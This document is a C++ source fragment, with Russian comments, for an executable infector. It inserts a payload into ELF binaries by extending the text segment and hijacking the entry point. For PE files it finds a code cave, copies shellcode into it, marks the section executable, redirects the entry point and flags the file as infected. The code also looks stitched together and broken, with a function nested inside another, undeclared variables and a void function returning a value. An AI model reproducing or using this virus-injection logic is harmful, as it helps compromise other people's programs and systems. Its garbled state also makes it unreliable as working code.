void change_entry_elf(auto& exec, vector<char>& bs) {

  char* txt_addr, par_addr, old_entry, end_of_txt;
  decltype(exec._phdr) phdr {exec._phdr};
  bool found_txt;

  for (size_t i{exec._ehdr->e_phnum}; i-- > 0; ++phdr) {

    if (found_txt) {
      phdr->p_offset += exec.page_size();
      continue;
    }

    if (phdr->p_type == PT_LOAD && phdr->p_flags == PF_R | PF_X) {
      txt_addr  = phdr->p_vaddr;
      par_addr  = phdr->p_vaddr + phdr->filesz;
      old_entry = exec._ehdr->e_entry;
      exec._ehdr->e_entry = par_addr;
      end_of_txt = phdr->p_offset + phdr->p_filesz;
      phdr->p_filesz += bs.size();
      phdr->p_memsz  += bs.size();
      found_txt = true;
    }

  }

  decltype(exec._shdr) shdr {exec._shdr};
  for (size_t i{exec._ehdr->e_shnum}; i-- > 0; ++shdr) {
    if (shdr->sh_offset >= end_of_txt) {
      shdr->sh_offset += exec.page_size();
    } else if (shdr->sh_addr + shdr->sh_size == par_addr) {
      shdr->sh_size += bs.size();
    }
  }

  exec._ehdr += exec.page_size();
  insert(exec, bs, par_addr);

}

void change_entry_pe(auto& exec, vector<char>& bs) {

  struct _CODE_CAVE {
    DWORD                 dwPosition;
    PIMAGE_SECTION_HEADER pish;
  };

  CODE_CAVE findCodeCave(LPBYTE lpFile, PEParser* ppeParser) {
    CODE_CAVE ccCave;

    DWORD     dwCount = 0;
    ccCave.dwPosition = 0;
    ccCave.pish       = NULL;

    for (int i = 1; i <= ppeParser->getNumberOfSections(); i++) { // Итерируем секции
      ccCave.pish = ppeParser->getSectionHeader(i);

      for (int j = 0; j < ccCave.pish->SizeOfRawData; j++) { // Ищем пещеру кода
        if (*(lpFile + ccCave.pish->PointerToRawData + j) == 0x00) {
          if (dwCount++ == (SHELLCODE_SIZE + 1)) {
            ccCave.dwPosition = j - SHELLCODE_SIZE +
                                ccCave.pish->PointerToRawData + 1;
            break;
          }
        } else {
          dwCount = 0;
        }
      }

      if (ccCave.dwPosition != 0) {
        break;
      }
    }

    if (dwCount == 0 || ccCave.dwPosition == 0) { // Если пещера кода не найдена, возвращаем пустую структуру
      return CODE_CAVE{ 0, NULL };
    } else {
      return ccCave;
    }
  }


  CODE_CAVE ccCave = findCodeCave(lpFile, ppeParser);
  if ((ccCave.pish == NULL) || (ccCave.dwPosition == 0)) {
    std::cerr << "[ERROR] Can't find code cave!" << std::endl;

    delete ppeParser;
    delete pmfTarget;
    return 1;
  }
  std::cout << "[INFO] Code cave located at 0x" << LPVOID(ccCave.dwPosition) << std::endl;
  PIMAGE_SECTION_HEADER pish       = ccCave.pish;
  DWORD                 dwPosition = ccCave.dwPosition;

  memcpy(LPBYTE(lpFile + dwPosition), lpShellcode, SHELLCODE_SIZE);
  pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
  pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
  markAsInfected(pidh);

}

void change_entry(auto& exec, vector<char>& bs) {
  exec.change_entry(bs);
}

void show(path p) {
  Executable e {p};
  e.show(); 
}
